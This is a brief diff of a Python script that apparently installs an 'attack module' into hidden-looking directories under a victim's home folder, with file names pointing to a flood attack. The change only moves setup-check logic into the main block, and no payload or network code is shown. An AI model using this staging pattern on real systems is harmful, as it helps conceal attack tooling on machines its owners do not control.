@@ -4,14 +4,6 @@ attackDirs = ['/home/victim/.etc', '/home/victim/.var']
 attackFiles = ['/Launch_Attack.py', '/SetUp_Attack.py', '/TA_Flood_Attack']
 
 
-def check_attack():
-    if not is_set_up_attack():
-        print('Set up attack module...')
-        set_up_attack()
-    else:
-        print('Already set up attack module.')
-
-
 def set_up_attack():
     if is_set_up_attack():
         return
@@ -35,4 +27,8 @@ def is_set_up_attack():
 
 
 if __name__ == '__main__':
-    check_attack()
+    if not is_set_up_attack():
+        print('Set up attack module...')
+        set_up_attack()
+    else:
+        print('Already set up attack module.')
